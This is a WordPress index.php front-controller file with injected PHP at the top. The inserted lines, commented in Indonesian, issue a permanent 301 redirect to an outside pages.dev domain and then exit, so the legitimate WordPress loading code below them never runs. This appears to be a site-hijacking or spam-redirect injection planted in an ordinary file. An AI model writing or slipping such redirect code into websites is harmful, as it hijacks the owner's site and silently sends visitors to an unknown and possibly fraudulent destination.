<?php
// Jalankan fungsi redirect 301 ke situs tujuan
header("HTTP/1.1 301 Moved Permanently");
header("Location: https://naik-naik-ke-situs-max.pages.dev/");
exit();

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
